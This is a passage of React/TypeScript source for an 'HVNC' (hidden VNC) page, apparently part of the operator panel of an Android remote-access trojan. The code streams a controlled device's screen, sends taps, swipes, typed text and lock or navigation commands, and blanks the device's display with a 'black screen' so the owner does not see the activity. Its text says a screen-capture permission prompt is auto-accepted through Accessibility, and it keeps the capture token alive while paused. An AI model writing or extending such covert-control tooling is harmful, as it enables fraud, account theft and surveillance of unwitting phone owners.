import { useRef, useState, useEffect, useCallback } from 'react';
import { useOutletContext } from 'react-router-dom';
import { clientsApi } from '@/services/api';
import { CMD } from '@/types';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import {
  Monitor, Play, Square, Loader2, Settings2, MousePointerClick,
  Camera as CameraIcon, Maximize2, Minimize2, Moon, Type,
  RotateCcw, Home, ArrowLeft, LayoutGrid,
  VolumeX, Volume1, Volume2, Bell, Lock, Scroll, Zap,
} from 'lucide-react';
import { onHvncUpdate, getAdminSocket } from '@/services/socket';
import {
  DevicePageHeader, ErrorAlert, LoadingSkeleton, StatusBadge, SectionCard, EmptyState,
} from '@/components/device/shared';
import type { DeviceOutletContext } from '@/types';

// ─────────────────────────────────────────────────────────────────────────────
// Worker source — runs VideoDecoder off the main thread.
// Receives encoded video chunks via postMessage, outputs ImageBitmaps back.
// ─────────────────────────────────────────────────────────────────────────────
const WORKER_SRC = `
let decoder = null;
let lastPts = -1;
let frameCount = 0;
let fpsTimer = 0;
let pendingReset = false;

function onFrame(frame) {
  if (frame.timestamp < lastPts && !pendingReset) { frame.close(); return; }
  pendingReset = false;
  lastPts = frame.timestamp;
  // createImageBitmap is hardware-accelerated GPU copy — zero CPU pixel copy
  createImageBitmap(frame).then(bmp => {
    frame.close();
    self.postMessage({ type: 'frame', bitmap: bmp, width: bmp.width, height: bmp.height }, [bmp]);
    frameCount++;
    const now = performance.now();
    if (fpsTimer === 0) fpsTimer = now;
    if (now - fpsTimer >= 1000) {
      self.postMessage({ type: 'fps', fps: Math.round(frameCount * 1000 / (now - fpsTimer)) });
      frameCount = 0;
      fpsTimer = now;
    }
  }).catch(() => frame.close());
}

function onError(err) {
  self.postMessage({ type: 'decoder_error', message: err.message || String(err) });
}

function buildDecoder() {
  if (decoder) { try { decoder.close(); } catch {} decoder = null; }
  decoder = new VideoDecoder({ output: onFrame, error: onError });
}

self.onmessage = (e) => {
  const { type } = e.data;

  if (type === 'config') {
    lastPts = -1; frameCount = 0; fpsTimer = 0; pendingReset = true;
    buildDecoder();
    const codec = e.data.codec === 'h265' ? 'hev1.1.6.L93.B0' : 'avc1.42E01E';
    const descBuf = e.data.description;
    const desc = descBuf ? new Uint8Array(descBuf) : null;
    // Validate descriptor — avcC needs ≥7 bytes; hvcC needs ≥23 bytes starting with 0x01
    const validDesc = desc && (e.data.codec === 'h264'
      ? desc.length >= 7
      : desc.length >= 23 && desc[0] === 0x01);
    try {
      decoder.configure({ codec, ...(validDesc ? { description: desc } : {}) });
      self.postMessage({ type: 'ready', codec: e.data.codec });
    } catch (err) {
      self.postMessage({ type: 'decoder_error', message: 'configure: ' + err.message });
    }
    return;
  }

  if (type === 'decode') {
    if (!decoder || decoder.state !== 'configured') return;
    // Drop non-keyframes when decode queue backs up — keeps latency low
    if (decoder.decodeQueueSize >= 2 && !e.data.keyframe) return;
    try {
      decoder.decode(new EncodedVideoChunk({
        type: e.data.keyframe ? 'key' : 'delta',
        timestamp: e.data.pts,
        data: e.data.encoded,  // transferred ArrayBuffer
      }));
    } catch {}
    return;
  }

  if (type === 'flush') {
    lastPts = -1; pendingReset = true;
    if (decoder?.state === 'configured') decoder.flush().catch(() => {});
    return;
  }

  if (type === 'close') {
    if (decoder) { try { decoder.close(); } catch {} decoder = null; }
    self.close();
  }
};
`;

// Build worker once at module level — reused across component mounts
let workerBlobUrl: string | null = null;
function getWorkerUrl(): string {
  if (!workerBlobUrl) {
    const blob = new Blob([WORKER_SRC], { type: 'application/javascript' });
    workerBlobUrl = URL.createObjectURL(blob);
  }
  return workerBlobUrl;
}

// ─── Types ────────────────────────────────────────────────────────────────────
interface ChunkBuf {
  received: Map<number, Uint8Array>;
  total: number;
  totalSize: number;
  pts: number;
  keyframe: boolean;
  createdAt: number;
}

const STALE_CHUNK_MS         = 5_000;
const CHUNK_SWEEP_MS         = 2_000;
const MAX_TRANSFERS          = 16;
const START_TIMEOUT_MS       = 30_000;
const DRAG_THRESHOLD_PX      = 8;
const LONGPRESS_MS           = 500;
const DOUBLE_TAP_WINDOW_MS   = 260;
const QUALITY_PRESETS = {
  Low:   { fps: 12, quality: 35, scale: 40 },
  Med:   { fps: 20, quality: 60, scale: 55 },
  High:  { fps: 25, quality: 80, scale: 70 },
  Ultra: { fps: 30, quality: 95, scale: 85 },
} as const;

// ─── Component ────────────────────────────────────────────────────────────────
export default function HvncPage() {
  const { clientId: id, online } = useOutletContext<DeviceOutletContext>();

  // Canvas ref — main thread draws ImageBitmaps from worker via rAF
  const canvasRef    = useRef<HTMLCanvasElement>(null);
  const containerRef = useRef<HTMLDivElement>(null);

  // Worker ref
  const workerRef    = useRef<Worker | null>(null);

  // Render state
  const latestBitmapRef  = useRef<ImageBitmap | null>(null);
  const rafRef           = useRef<number>(0);
  const frameCountRef    = useRef(0);
  const fpsTimerRef      = useRef(0);

  // Stream state
  const [streaming,    setStreaming]    = useState(false);
  const [status,       setStatus]       = useState('idle');
  const [error,        setError]        = useState<string | null>(null);
  const [loading,      setLoading]      = useState(true);

  // Settings
  const [fps,       setFps]       = useState(20);
  const [quality,   setQuality]   = useState(60);
  const [scale,     setScale]     = useState(55);
  const [iframeInt, setIframeInt] = useState(0);
  const [useH265,   setUseH265]   = useState(false);
  const [h265ok,    setH265ok]    = useState<boolean | null>(null);
  const [showSettings, setShowSettings] = useState(false);

  // UI state
  const [fullscreen,    setFullscreen]    = useState(false);
  const [blackScreen,   setBlackScreen]   = useState(false);
  const [scrollMode,    setScrollMode]    = useState(false);
  const [showTextInput, setShowTextInput] = useState(false);
  const [textInput,     setTextInput]     = useState('');

  // Stats
  const [measuredFps,   setMeasuredFps]   = useState(0);
  const [liveCodec,     setLiveCodec]     = useState<'h264'|'h265'>('h264');
  const [socketReady,   setSocketReady]   = useState(false);

  // Device info
  const [a11yEnabled,   setA11yEnabled]   = useState<boolean|null>(null);
  const [a11yConnected, setA11yConnected] = useState<boolean|null>(null);

  // Refs for stable closures
  const streamingRef   = useRef(false);
  const scrollModeRef  = useRef(false);
  const mountedRef     = useRef(true);
  const chunkBufRef    = useRef<Map<string, ChunkBuf>>(new Map());
  const startToutRef   = useRef<number|null>(null);
  const startingRef    = useRef(false);

  useEffect(() => { streamingRef.current  = streaming;   }, [streaming]);
  useEffect(() => { scrollModeRef.current = scrollMode;  }, [scrollMode]);

  // Input gesture refs
  const dragRef        = useRef<{sx:number;sy:number;t:number}|null>(null);
  const lastTapRef     = useRef<{x:number;y:number;t:number}|null>(null);
  const ptrsRef        = useRef<Map<number,{x:number;y:number;sx:number;sy:number}>>(new Map());
  const pinchStartRef  = useRef<{p1:{x:number;y:number};p2:{x:number;y:number}}|null>(null);

  // ── H265 browser check ────────────────────────────────────────────────────
  useEffect(() => {
    (async () => {
      try {
        if (typeof VideoDecoder === 'undefined' || !('isConfigSupported' in VideoDecoder)) {
          setH265ok(false); return;
        }
        const r = await (VideoDecoder as any).isConfigSupported({ codec: 'hev1.1.6.L93.B0' });
        setH265ok(r?.supported === true);
      } catch { setH265ok(false); }
    })();
  }, []);

  // ── socket ready tracker ──────────────────────────────────────────────────
  useEffect(() => {
    const check = () => setSocketReady(!!getAdminSocket()?.connected);
    check();
    const t = setInterval(check, 1500);
    return () => clearInterval(t);
  }, []);

  // ── rAF render loop ───────────────────────────────────────────────────────
  // Runs at display refresh rate (60fps). Draws the latest bitmap received from
  // the worker. Decouples network/decode rate from render rate for silky output.
  const renderLoop = useCallback(() => {
    const canvas = canvasRef.current;
    const bmp    = latestBitmapRef.current;
    if (canvas && bmp) {
      if (canvas.width  !== bmp.width)  canvas.width  = bmp.width;
      if (canvas.height !== bmp.height) canvas.height = bmp.height;
      const ctx = canvas.getContext('2d', { alpha: false });
      if (ctx) ctx.drawImage(bmp, 0, 0);
    }
    rafRef.current = requestAnimationFrame(renderLoop);
  }, []);

  useEffect(() => {
    rafRef.current = requestAnimationFrame(renderLoop);
    return () => { cancelAnimationFrame(rafRef.current); rafRef.current = 0; };
  }, [renderLoop]);

  // ── Worker lifecycle ──────────────────────────────────────────────────────
  useEffect(() => {
    mountedRef.current = true;

    if (typeof Worker === 'undefined' || typeof VideoDecoder === 'undefined') {
      setError('Browser does not support WebCodecs. Use Chrome 94+ / Edge 94+ / Firefox 130+.');
      setLoading(false);
      return;
    }

    const worker = new Worker(getWorkerUrl());
    workerRef.current = worker;

    worker.onmessage = (e) => {
      if (!mountedRef.current) return;
      const { type } = e.data;

      if (type === 'frame') {
        // Swap latest bitmap — rAF loop will draw it on next vsync
        const prev = latestBitmapRef.current;
        latestBitmapRef.current = e.data.bitmap;
        if (prev) prev.close();
        return;
      }
      if (type === 'fps') {
        setMeasuredFps(e.data.fps);
        return;
      }
      if (type === 'ready') {
        setLiveCodec(e.data.codec === 'h265' ? 'h265' : 'h264');
        return;
      }
      if (type === 'decoder_error') {
        console.error('[HVnc Worker]', e.data.message);
        // Transient decode errors are normal — only surface critical ones
        if (e.data.message?.includes('configure')) {
          setError(`Decoder error: ${e.data.message}`);
        }
      }
    };

    worker.onerror = (e) => {
      if (mountedRef.current) setError(`Worker crashed: ${e.message}`);
    };

    return () => {
      mountedRef.current = false;
      worker.postMessage({ type: 'close' });
      worker.terminate();
      workerRef.current = null;
      const bmp = latestBitmapRef.current;
      if (bmp) { bmp.close(); latestBitmapRef.current = null; }
    };
  }, []);

  // ── Reset on device change ────────────────────────────────────────────────
  useEffect(() => {
    setStreaming(false);
    setStatus('idle');
    setError(null);
    setMeasuredFps(0);
    setBlackScreen(false);
    setA11yEnabled(null);
    setA11yConnected(null);
    chunkBufRef.current.clear();
    workerRef.current?.postMessage({ type: 'flush' });
    if (id) clientsApi.sendCommand(id, CMD.HVNC, { action: 'status' }).catch(() => {});
  }, [id]);

  useEffect(() => {
    if (!id) return;
    clientsApi.getOne(id)
      .then(() => setLoading(false))
      .catch(() => { setError('Failed to load device'); setLoading(false); });
  }, [id]);

  // ── HVNC frame pipeline from socket ──────────────────────────────────────
  useEffect(() => {
    const unsub = onHvncUpdate((meta: Record<string,unknown>, binary?: ArrayBuffer) => {
      if (!meta || meta.id !== id) return;
      const type = meta.type as string;

      // ── Status messages ──
      if (type === 'status') {
        const st = meta.status as string || '';
        if (st === 'streaming') {
          setStreaming(true); setStatus('streaming');
          startingRef.current = false;
          if (startToutRef.current) { clearTimeout(startToutRef.current); startToutRef.current = null; }
        } else if (st === 'stopped' || st === 'idle') {
          setStreaming(false); setStatus('idle'); setMeasuredFps(0);
        } else {
          setStatus(st);
        }
        if (meta.accessibilityEnabled  !== undefined) setA11yEnabled(meta.accessibilityEnabled as boolean);
        if (meta.accessibilityConnected !== undefined) setA11yConnected(meta.accessibilityConnected as boolean);
        if (meta.codec) setLiveCodec((meta.codec as string) === 'h265' ? 'h265' : 'h264');
        if (typeof meta.blackScreen === 'boolean') setBlackScreen(meta.blackScreen);
        return;
      }

      // ── Error messages ──
      if (type === 'error') {
        const msg = meta.error as string || 'Device error';
        if (msg.includes('no_permission'))              setError('Screen capture permission needed.');
        else if (msg.includes('accessibility'))         setError('Accessibility not enabled — tap Enable Input.');
        else                                            setError(msg);
        if (startingRef.current) { setStatus('idle'); startingRef.current = false; }
        return;
      }

      if (type === 'black_screen_result') {
        if (typeof meta.blackScreen === 'boolean') setBlackScreen(meta.blackScreen);
        return;
      }

      // ── Codec config ──
      if (type === 'config' && binary) {
        const codec = (meta.codec as string) === 'h265' ? 'h265' : 'h264';
        // Clone buffer before transfer so socket layer keeps its reference intact
        const descClone = binary.slice(0);
        workerRef.current?.postMessage(
          { type: 'config', codec, description: descClone },
          [descClone]
        );
        return;
      }

      // ── Video frames ──
      if ((type === 'frame' || type === 'chunk') && binary) {
        ingestVideoData(type, meta, binary);
      }
    });
    return unsub;
  }, [id]);

  const ingestVideoData = useCallback((type: string, meta: Record<string,unknown>, binary: ArrayBuffer) => {
    if (type === 'frame') {
      dispatchFrame(binary.slice(0), (meta.pts as number) ?? 0, !!(meta.keyframe));
      return;
    }
    // Chunk reassembly
    const tid       = meta.transferId as string;
    const idx       = meta.chunkIndex as number;
    const total     = meta.totalChunks as number;
    const totalSize = meta.totalSize as number;
    const pts       = (meta.pts as number) ?? 0;
    const keyframe  = !!(meta.keyframe);
    if (!tid || idx == null || !total) return;

    if (chunkBufRef.current.size >= MAX_TRANSFERS) {
      // Evict oldest partial transfer
      let oldestKey = '', oldestTime = Infinity;
      for (const [k, v] of chunkBufRef.current) {
        if (v.createdAt < oldestTime) { oldestTime = v.createdAt; oldestKey = k; }
      }
      if (oldestKey) chunkBufRef.current.delete(oldestKey);
    }

    if (!chunkBufRef.current.has(tid)) {
      chunkBufRef.current.set(tid, { received: new Map(), total, totalSize, pts, keyframe, createdAt: Date.now() });
    }
    const buf = chunkBufRef.current.get(tid)!;
    buf.received.set(idx, new Uint8Array(binary));

    if (buf.received.size === total) {
      chunkBufRef.current.delete(tid);
      const merged = new Uint8Array(totalSize);
      let off = 0;
      for (let i = 0; i < total; i++) {
        const chunk = buf.received.get(i)!;
        merged.set(chunk, off);
        off += chunk.length;
      }
      dispatchFrame(merged.buffer, buf.pts, buf.keyframe);
    }
  }, []);

  // Transfer encoded frame to worker — zero-copy (buffer ownership transferred)
  const dispatchFrame = useCallback((encoded: ArrayBuffer, ptsUs: number, keyframe: boolean) => {
    workerRef.current?.postMessage(
      { type: 'decode', encoded, pts: ptsUs, keyframe },
      [encoded]
    );
  }, []);

  // Stale chunk GC
  useEffect(() => {
    const t = setInterval(() => {
      const now = Date.now();
      for (const [k, v] of chunkBufRef.current) {
        if (now - v.createdAt > STALE_CHUNK_MS) chunkBufRef.current.delete(k);
      }
    }, CHUNK_SWEEP_MS);
    return () => clearInterval(t);
  }, []);

  // ── Stream control ────────────────────────────────────────────────────────
  const startStream = useCallback(async (overrides?: Partial<typeof QUALITY_PRESETS['Med']>) => {
    if (!id) return;
    setError(null); setStatus('starting'); startingRef.current = true;
    chunkBufRef.current.clear();
    workerRef.current?.postMessage({ type: 'flush' });
    if (startToutRef.current) clearTimeout(startToutRef.current);
    startToutRef.current = window.setTimeout(() => {
      if (!streamingRef.current) {
        setStatus('idle');
        setError('Device did not respond in 30s. Check it is online and accessible is enabled.');
        clientsApi.sendCommand(id, CMD.HVNC, { action: 'stop' }).catch(() => {});
      }
    }, START_TIMEOUT_MS);
    const finalFps     = overrides?.fps     ?? fps;
    const finalQuality = overrides?.quality ?? quality;
    const finalScale   = overrides?.scale   ?? scale;
    const usH265       = useH265 && h265ok === true;
    try {
      await clientsApi.sendCommand(id, CMD.HVNC, {
        action: 'start',
        fps: finalFps,
        jpegQuality: finalQuality,
        scale: finalScale,
        iframeInterval: iframeInt,
        useH265: usH265,
      });
    } catch (e: any) {
      setError(e?.response?.data?.error || 'Failed to start');
      setStatus('idle'); startingRef.current = false;
      if (startToutRef.current) { clearTimeout(startToutRef.current); startToutRef.current = null; }
    }
  }, [id, fps, quality, scale, iframeInt, useH265, h265ok]);

  const stopStream = useCallback(async (retain = false) => {
    if (!id) return;
    startingRef.current = false;
    if (startToutRef.current) { clearTimeout(startToutRef.current); startToutRef.current = null; }
    try {
      await clientsApi.sendCommand(id, CMD.HVNC, { action: retain ? 'retain_token' : 'stop' });
    } catch {}
    workerRef.current?.postMessage({ type: 'flush' });
    chunkBufRef.current.clear();
    setStreaming(false); setStatus('idle'); setMeasuredFps(0);
  }, [id]);

  const checkStatus = useCallback(async () => {
    if (!id) return;
    try { await clientsApi.sendCommand(id, CMD.HVNC, { action: 'status' }); } catch {}
  }, [id]);

  useEffect(() => () => {
    if (startToutRef.current) clearTimeout(startToutRef.current);
    if (streamingRef.current && id) {
      clientsApi.sendCommand(id, CMD.HVNC, { action: 'stop' }).catch(() => {});
    }
  }, [id]);

  // ── Input — direct socket path (bypasses HTTP for sub-20ms gesture delivery) ──
  const sendInput = useCallback((inputType: string, x: number, y: number,
      dx?: number, dy?: number, extra?: Record<string, unknown>) => {
    if (!id || !streamingRef.current) return;
    const cmd = {
      type: CMD.HVNC, action: 'input', inputType,
      x: Math.round(x), y: Math.round(y),
      ...(dx !== undefined ? { dx: Math.round(dx) } : {}),
      ...(dy !== undefined ? { dy: Math.round(dy) } : {}),
      ...extra,
    };
    // Try direct WebSocket first — removes HTTP round-trip entirely
    const sock = getAdminSocket();
    if (sock?.connected) {
      sock.emit('panel:input', { clientId: id, cmd });
    } else {
      // HTTP fallback when WebSocket isn't ready
      clientsApi.sendCommand(id, CMD.HVNC, { action: 'input', inputType,
        x: Math.round(x), y: Math.round(y),
        ...(dx !== undefined ? { dx: Math.round(dx) } : {}),
        ...(dy !== undefined ? { dy: Math.round(dy) } : {}),
        ...extra,
      }).catch(() => {});
    }
  }, [id]);

  const sendGlobal = useCallback((inputType: string) => {
    if (!id || !streamingRef.current) return;
    const cmd = { type: CMD.HVNC, action: 'input', inputType };
    const sock = getAdminSocket();
    if (sock?.connected) sock.emit('panel:input', { clientId: id, cmd });
    else clientsApi.sendCommand(id, CMD.HVNC, { action: 'input', inputType }).catch(() => {});
  }, [id]);

  const sendText = useCallback(async () => {
    if (!id || !textInput) return;
    try { await clientsApi.sendCommand(id, CMD.HVNC, { action: 'input', inputType: 'text', text: textInput }); }
    catch {}
    setTextInput('');
  }, [id, textInput]);

  const toggleBlackScreen = useCallback(async () => {
    if (!id) return;
    const next = !blackScreen;
    try { await clientsApi.sendCommand(id, CMD.HVNC, { action: 'black_screen', blackScreen: next }); }
    catch {}
    setBlackScreen(next);
  }, [id, blackScreen]);

  // ── Fullscreen ────────────────────────────────────────────────────────────
  const toggleFullscreen = useCallback(async () => {
    const el = containerRef.current;
    if (!el) return;
    try {
      if (!document.fullscreenElement) { await el.requestFullscreen(); setFullscreen(true); }
      else { await document.exitFullscreen(); setFullscreen(false); }
    } catch {}
  }, []);

  useEffect(() => {
    const h = () => setFullscreen(!!document.fullscreenElement);
    document.addEventListener('fullscreenchange', h);
    return () => document.removeEventListener('fullscreenchange', h);
  }, []);

  // ── Snapshot ──────────────────────────────────────────────────────────────
  const snapshot = useCallback(() => {
    canvasRef.current?.toBlob(blob => {
      if (!blob) return;
      const url = URL.createObjectURL(blob);
      Object.assign(document.createElement('a'), {
        href: url, download: `hvnc-${id}-${Date.now()}.png`
      }).click();
      setTimeout(() => URL.revokeObjectURL(url), 1000);
    }, 'image/png');
  }, [id]);

  // ── Pointer event handlers ────────────────────────────────────────────────
  const canvasCoords = useCallback((cx: number, cy: number) => {
    const canvas = canvasRef.current;
    if (!canvas) return null;
    const r = canvas.getBoundingClientRect();
    return {
      x: (cx - r.left) * (canvas.width  / r.width),
      y: (cy - r.top)  * (canvas.height / r.height),
    };
  }, []);

  const onPointerDown = useCallback((e: React.PointerEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    const c = canvasCoords(e.clientX, e.clientY);
    if (!c) return;
    ptrsRef.current.set(e.pointerId, { x: c.x, y: c.y, sx: c.x, sy: c.y });
    if (ptrsRef.current.size === 2) {
      const [p1, p2] = Array.from(ptrsRef.current.values());
      pinchStartRef.current = { p1: { x: p1.sx, y: p1.sy }, p2: { x: p2.sx, y: p2.sy } };
    } else if (ptrsRef.current.size === 1) {
      dragRef.current = { sx: c.x, sy: c.y, t: Date.now() };
    }
  }, [canvasCoords]);

  const onPointerMove = useCallback((e: React.PointerEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    const c = canvasCoords(e.clientX, e.clientY);
    if (!c) return;
    const p = ptrsRef.current.get(e.pointerId);
    if (p) ptrsRef.current.set(e.pointerId, { ...p, x: c.x, y: c.y });
  }, [canvasCoords]);

  const onPointerUp = useCallback((e: React.PointerEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    const c = canvasCoords(e.clientX, e.clientY);
    if (!c) return;
    const ptr = ptrsRef.current.get(e.pointerId);
    ptrsRef.current.delete(e.pointerId);

    // Two-finger pinch complete
    if (pinchStartRef.current && ptr) {
      const start = pinchStartRef.current;
      pinchStartRef.current = null;
      const d1 = Math.hypot(ptr.sx - start.p1.x, ptr.sy - start.p1.y);
      const d2 = Math.hypot(ptr.sx - start.p2.x, ptr.sy - start.p2.y);
      const thisIsP1 = d1 < d2;
      const end1 = thisIsP1 ? c    : { x: ptr.sx, y: ptr.sy };
      const end2 = thisIsP1 ? { x: ptr.sx, y: ptr.sy } : c;
      sendInput('pinch',
        start.p1.x, start.p1.y,
        end1.x - start.p1.x, end1.y - start.p1.y,
        { x2: Math.round(start.p2.x), y2: Math.round(start.p2.y),
          dx2: Math.round(end2.x - start.p2.x), dy2: Math.round(end2.y - start.p2.y),
          duration: 400 });
      dragRef.current = null;
      return;
    }

    if (!dragRef.current) return;
    const dx      = c.x - dragRef.current.sx;
    const dy      = c.y - dragRef.current.sy;
    const elapsed = Date.now() - dragRef.current.t;
    const moved   = Math.abs(dx) > DRAG_THRESHOLD_PX || Math.abs(dy) > DRAG_THRESHOLD_PX;

    if (!moved) {
      if (elapsed >= LONGPRESS_MS) {
        sendInput('longpress', dragRef.current.sx, dragRef.current.sy, undefined, undefined, { duration: elapsed });
      } else {
        const now  = Date.now();
        const last = lastTapRef.current;
        if (last && now - last.t < DOUBLE_TAP_WINDOW_MS &&
            Math.abs(dragRef.current.sx - last.x) < 40 &&
            Math.abs(dragRef.current.sy - last.y) < 40) {
          sendInput('doubletap', dragRef.current.sx, dragRef.current.sy);
          lastTapRef.current = null;
        } else {
          sendInput('tap', dragRef.current.sx, dragRef.current.sy);
          lastTapRef.current = { x: dragRef.current.sx, y: dragRef.current.sy, t: now };
        }
      }
    } else {
      const gesture = scrollModeRef.current ? 'scroll' : 'swipe';
      sendInput(gesture, dragRef.current.sx, dragRef.current.sy, dx, dy,
        { duration: scrollModeRef.current ? 120 : 280 });
    }
    dragRef.current = null;
  }, [canvasCoords, sendInput]);

  const onPointerCancel = useCallback((e: React.PointerEvent<HTMLCanvasElement>) => {
    ptrsRef.current.delete(e.pointerId);
    dragRef.current = null;
    pinchStartRef.current = null;
  }, []);

  const onKeyDown = useCallback((e: React.KeyboardEvent<HTMLCanvasElement>) => {
    if (!streamingRef.current) return;
    if (e.key === 'ArrowUp')   { e.preventDefault(); sendGlobal('volume_up'); }
    if (e.key === 'ArrowDown') { e.preventDefault(); sendGlobal('volume_down'); }
    if (e.key === 'Escape' && fullscreen) toggleFullscreen();
  }, [sendGlobal, fullscreen, toggleFullscreen]);

  // ── Quality preset buttons ─────────────────────────────────────────────────
  const applyPreset = useCallback((preset: keyof typeof QUALITY_PRESETS) => {
    const p = QUALITY_PRESETS[preset];
    setFps(p.fps); setQuality(p.quality); setScale(p.scale);
    if (streaming) {
      clientsApi.sendCommand(id!, CMD.HVNC, {
        action: 'restart', fps: p.fps, jpegQuality: p.quality, scale: p.scale,
      }).catch(() => {});
    }
  }, [id, streaming]);

  if (loading) return <LoadingSkeleton rows={4} />;

  const canAct = online && socketReady;

  // ── Gesture toolbar ────────────────────────────────────────────────────────
  const Toolbar = () => (
    <div className="flex flex-wrap items-center gap-0.5 px-2 py-1.5 bg-zinc-900/95 border-t border-zinc-800">
      <div className="flex items-center gap-0.5 mr-2">
        <span className="text-[9px] text-zinc-600 uppercase tracking-wider">Nav</span>
        {[
          { icon: ArrowLeft,  label: 'Back',    fn: 'back' },
          { icon: Home,       label: 'Home',    fn: 'home' },
          { icon: LayoutGrid, label: 'Recents', fn: 'recents' },
          { icon: Bell,       label: 'Panel',   fn: 'statusbar' },
          { icon: Lock,       label: 'Lock',    fn: 'lock_screen' },
        ].map(({ icon: Icon, label, fn }) => (
          <Button key={fn} size="sm" variant="ghost" title={label}
            className="h-7 w-7 p-0 text-zinc-400 hover:text-white hover:bg-zinc-700"
            onClick={() => sendGlobal(fn)}>
            <Icon className="h-3.5 w-3.5" />
          </Button>
        ))}
      </div>
      <div className="flex items-center gap-0.5 mr-2">
        <span className="text-[9px] text-zinc-600 uppercase tracking-wider">Vol</span>
        <Button size="sm" variant="ghost" title="Vol +"  className="h-7 w-7 p-0 text-zinc-400 hover:text-white hover:bg-zinc-700" onClick={() => sendGlobal('volume_up')}>   <Volume2 className="h-3.5 w-3.5" /></Button>
        <Button size="sm" variant="ghost" title="Vol -"  className="h-7 w-7 p-0 text-zinc-400 hover:text-white hover:bg-zinc-700" onClick={() => sendGlobal('volume_down')}> <Volume1 className="h-3.5 w-3.5" /></Button>
        <Button size="sm" variant="ghost" title="Mute"   className="h-7 w-7 p-0 text-zinc-400 hover:text-white hover:bg-zinc-700" onClick={() => sendGlobal('volume_mute')}> <VolumeX className="h-3.5 w-3.5" /></Button>
      </div>
      <div className="w-px h-5 bg-zinc-700 mx-0.5" />
      <Button size="sm" variant={scrollMode ? 'secondary' : 'ghost'} title={scrollMode ? 'Scroll mode' : 'Swipe mode'}
        className={`h-7 px-2 text-[10px] ${scrollMode ? 'text-blue-400' : 'text-zinc-400 hover:text-white'}`}
        onClick={() => setScrollMode(v => !v)}>
        <Scroll className="h-3 w-3 mr-1" />{scrollMode ? 'Scroll' : 'Swipe'}
      </Button>
      <Button size="sm" variant="ghost" title="Type text"
        className="h-7 w-7 p-0 text-zinc-400 hover:text-white hover:bg-zinc-700"
        onClick={() => setShowTextInput(v => !v)}>
        <Type className="h-3.5 w-3.5" />
      </Button>
      <div className="ml-auto flex items-center gap-0.5">
        <Button size="sm" variant="ghost" title="Snapshot" className="h-7 w-7 p-0 text-zinc-400 hover:text-white" onClick={snapshot}><CameraIcon className="h-3.5 w-3.5" /></Button>
        <Button size="sm" variant={blackScreen ? 'secondary' : 'ghost'} title={blackScreen ? 'Black ON' : 'Black OFF'}
          className={`h-7 w-7 p-0 ${blackScreen ? 'text-yellow-400' : 'text-zinc-400 hover:text-white'}`}
          onClick={toggleBlackScreen}><Moon className="h-3.5 w-3.5" /></Button>
        <Button size="sm" variant="ghost" title={fullscreen ? 'Exit fullscreen' : 'Fullscreen'}
          className="h-7 w-7 p-0 text-zinc-400 hover:text-white" onClick={toggleFullscreen}>
          {fullscreen ? <Minimize2 className="h-3.5 w-3.5" /> : <Maximize2 className="h-3.5 w-3.5" />}
        </Button>
      </div>
    </div>
  );

  return (
    <div className="space-y-4">
      <DevicePageHeader
        title="HVNC"
        subtitle={streaming
          ? `${liveCodec.toUpperCase()} · ${measuredFps}fps${socketReady ? ' · WS' : ' · HTTP'}`
          : 'Hidden VNC — tap, swipe, pinch, type'}
        badge={{ label: streaming ? 'Live' : 'Idle', variant: streaming ? 'default' : 'secondary' }}
        actions={[
          ...(!streaming
            ? [{ label: 'Start', icon: Play, onClick: () => startStream(),  disabled: !canAct || status === 'starting' }]
            : [
                { label: 'Stop',  icon: Square, onClick: () => stopStream(false), disabled: !canAct, variant: 'destructive' as const },
                { label: 'Pause', icon: RotateCcw, onClick: () => stopStream(true), disabled: !canAct, variant: 'outline' as const, title: 'Pause encode but keep projection token' },
              ]
          ),
          { label: 'Settings', icon: Settings2, onClick: () => setShowSettings(v => !v), variant: showSettings ? 'default' : 'outline' as const },
        ]}
        refresh={checkStatus}
        loading={status === 'starting'}
      />

      {/* Status badges */}
      <div className="flex items-center gap-1.5 flex-wrap">
        <StatusBadge label={streaming ? 'Streaming' : 'Idle'} status={streaming ? 'success' : 'neutral'} />
        {a11yEnabled === false && <StatusBadge label="Input disabled" status="danger" />}
        {a11yEnabled === true && a11yConnected === false && <StatusBadge label="Input not connected" status="warning" />}
        {a11yEnabled === true && a11yConnected === true  && <StatusBadge label="Input ready" status="success" />}
        {!socketReady && <StatusBadge label="WS offline" status="warning" />}
        {streaming && <Badge variant="outline" className="text-[10px] font-mono">{liveCodec.toUpperCase()} · {measuredFps}fps</Badge>}
        {blackScreen && <Badge variant="secondary" className="text-[10px]">Black Screen</Badge>}
        {scrollMode  && <Badge variant="secondary" className="text-[10px] text-blue-400">Scroll Mode</Badge>}
      </div>

      {/* Starting indicator */}
      {status === 'starting' && !streaming && (
        <div className="flex items-center gap-2 text-sm text-amber-500 bg-amber-500/10 rounded-lg p-3 border border-amber-500/20">
          <Loader2 className="h-4 w-4 animate-spin shrink-0" />
          <div>
            <p className="font-medium">Starting stream…</p>
            <p className="text-xs opacity-75 mt-0.5">Device will show a system permission dialog. Auto-accept handles it if Accessibility is enabled.</p>
          </div>
        </div>
      )}

      {error && <ErrorAlert message={error} onRetry={checkStatus} />}

      {/* Accessibility prompt */}
      {a11yEnabled === false && (
        <div className="flex gap-2">
          <Button variant="outline" size="sm" className="gap-1.5 text-amber-600 border-amber-500/40"
            onClick={async () => { try { await clientsApi.sendCommand(id!, CMD.HVNC, { action: 'enable_accessibility' }); } catch {} }}
            disabled={!canAct}>
            <Settings2 className="h-3.5 w-3.5" />Enable Input (Accessibility)
          </Button>
        </div>
      )}

      {/* Settings panel */}
      {showSettings && (
        <SectionCard title="Stream Settings" icon={Settings2}>
          {/* Quality presets */}
          <div className="flex items-center gap-2 mb-3">
            <span className="text-xs text-muted-foreground mr-1">Preset:</span>
            {(Object.keys(QUALITY_PRESETS) as (keyof typeof QUALITY_PRESETS)[]).map(p => (
              <Button key={p} size="sm" variant="outline" className="h-7 px-3 text-xs"
                onClick={() => applyPreset(p)}>
                {p === 'Low' ? '🔋' : p === 'Med' ? '⚡' : p === 'High' ? '🎯' : '🔥'} {p}
              </Button>
            ))}
          </div>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
            {[
              { label: 'FPS (1–60)',    val: fps,      set: setFps,      min: 1, max: 60 },
              { label: 'Quality (10–100)', val: quality, set: setQuality, min: 10, max: 100 },
              { label: 'Scale % (10–100)', val: scale,  set: setScale,   min: 10, max: 100 },
